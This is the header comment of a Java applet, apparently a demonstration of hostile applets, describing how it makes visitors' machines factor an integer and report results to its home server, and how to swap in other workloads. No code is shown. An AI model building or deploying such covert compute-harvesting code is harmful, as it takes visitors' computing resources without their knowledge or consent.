/*  This Java applet makes you try to factor a moderately long integer
    by trial division, and it reports the reults back to it's home.
    Clearly the same could be done for many, many other sorts of
    calculations.  While it performs no hostile actions per se, it does
    put your workstation to work for somebody else, perhaps a business
    competitor or someone trying to crack codes.  To create an applet
    that does other sorts of work, you can replace the class GetFactor
    with another working class and adjust the classes Report and
    ReportServerSocket accordingly.  */
